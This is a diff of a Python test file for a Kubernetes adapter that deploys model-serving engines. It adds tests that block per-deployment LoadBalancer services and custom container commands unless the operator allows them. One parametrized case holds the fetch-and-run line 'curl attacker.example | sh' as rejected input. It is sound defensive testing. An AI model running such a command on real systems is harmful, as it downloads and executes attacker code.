@@ -53,6 +53,12 @@ def test_unknown_engine_falls_back():
 # ---------------------------------------------------------------------------
 # Fixtures
 # ---------------------------------------------------------------------------
+@pytest.fixture(autouse=True)
+def _custom_commands_on(monkeypatch):
+    """Most tests here send a command; the ones about the switch turn it off."""
+    monkeypatch.setenv("K8S_ALLOW_CUSTOM_COMMANDS", "true")
+
+
 def _adapter():
     """An adapter with both API clients mocked and no kubeconfig loaded."""
     with patch("providers.k8s.k8s_adapter.config"):
@@ -262,18 +268,26 @@ async def test_service_type_from_env(monkeypatch):
 
 
 @pytest.mark.asyncio
-async def test_metadata_beats_env(monkeypatch):
+async def test_a_deployment_can_not_choose_its_service_type(monkeypatch):
+    """A per-deployment LoadBalancer would put an unauthenticated engine on
+    the internet; the type is the operator's K8S_SERVICE_TYPE."""
     monkeypatch.setenv("K8S_SERVICE_TYPE", "NodePort")
     a = _adapter()
+    with pytest.raises(ValueError, match="service type 'LoadBalancer' is not allowed"):
+        await a.provision_node(provider_resource_id="node-1", pool_id="p1",
+                               metadata=_metadata(service_type="LoadBalancer"))
+    a.core.create_namespaced_service.assert_not_called()
+    a.apps.create_namespaced_stateful_set.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_a_service_type_matching_the_operators_is_fine(monkeypatch):
+    monkeypatch.setenv("K8S_SERVICE_TYPE", "ClusterIP")
+    a = _adapter()
     a.core.read_namespaced_service.return_value = _service()
-
-    await a.provision_node(
-        provider_resource_id="node-1", pool_id="p1",
-        metadata=_metadata(service_type="ClusterIP"),
-    )
-
-    svc = a.core.create_namespaced_service.call_args.kwargs["body"]
-    assert svc.spec.type == "ClusterIP"
+    await a.provision_node(provider_resource_id="node-1", pool_id="p1",
+                           metadata=_metadata(service_type="ClusterIP"))
+    assert a.core.create_namespaced_service.call_args.kwargs["body"].spec.type == "ClusterIP"
 
 
 @pytest.mark.asyncio
@@ -1656,3 +1670,52 @@ async def test_engine_pods_get_no_service_account_token(monkeypatch):
     a.core.read_namespaced_service.return_value = _service(port=8000)
     await a.provision_node(provider_resource_id="node-1", pool_id="p1", metadata=_vllm_metadata())
     assert _workload_of(a).spec.template.spec.automount_service_account_token is False
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("field,value", [
+    ("cmd", ["sh", "-c", "curl attacker.example | sh"]),
+    ("command", ["sh", "-c", "id"]),
+])
+async def test_a_custom_command_needs_the_operators_switch(monkeypatch, field, value):
+    """With an allowed image, the deployment's own command runs anything."""
+    monkeypatch.delenv("K8S_ALLOW_CUSTOM_COMMANDS", raising=False)
+    monkeypatch.delenv("K8S_SERVICE_TYPE", raising=False)
+    a = _adapter()
+    md = _vllm_metadata(image="pytorch/pytorch:2.1.0-cuda12.1-cudnn8-runtime", engine="training")
+    md[field] = value
+    with pytest.raises(ValueError, match="K8S_ALLOW_CUSTOM_COMMANDS"):
+        await a.provision_node(provider_resource_id="node-1", pool_id="p1", metadata=md)
+    a.core.create_namespaced_service.assert_not_called()
+    a.apps.create_namespaced_stateful_set.assert_not_called()
+
+
+@pytest.mark.asyncio
+async def test_the_operator_can_allow_custom_commands(monkeypatch):
+    monkeypatch.setenv("K8S_ALLOW_CUSTOM_COMMANDS", "true")
+    monkeypatch.delenv("K8S_SERVICE_TYPE", raising=False)
+    a = _adapter()
+    a.core.read_namespaced_service.return_value = _service(port=8000)
+    md = _vllm_metadata(image="pytorch/pytorch:2.1.0-cuda12.1-cudnn8-runtime", engine="training",
+                        gpu_allocated=0)
+    md["cmd"] = ["sleep", "infinity"]
+    await a.provision_node(provider_resource_id="node-1", pool_id="p1", metadata=md)
+    assert _container_of(a).args == ["sleep", "infinity"]
+
+
+@pytest.mark.asyncio
+async def test_dashboard_engines_deploy_without_the_switch(monkeypatch):
+    """The dashboard's Ollama config sends cmd ["serve"], which Ollama's own
+    start-up replaces; vLLM sends no command."""
+    monkeypatch.delenv("K8S_ALLOW_CUSTOM_COMMANDS", raising=False)
+    monkeypatch.delenv("K8S_SERVICE_TYPE", raising=False)
+    a = _adapter()
+    a.core.read_namespaced_service.return_value = _service()
+    await a.provision_node(provider_resource_id="node-1", pool_id="p1", metadata=_metadata(
+        model_id="qwen2:0.5b", cmd=["serve"], gpu_allocated=0))
+    assert _container_of(a).args != ["serve"]
+
+    b = _adapter()
+    b.core.read_namespaced_service.return_value = _service(port=8000)
+    await b.provision_node(provider_resource_id="node-1", pool_id="p1", metadata=_vllm_metadata())
+    assert _container_of(b).command is None
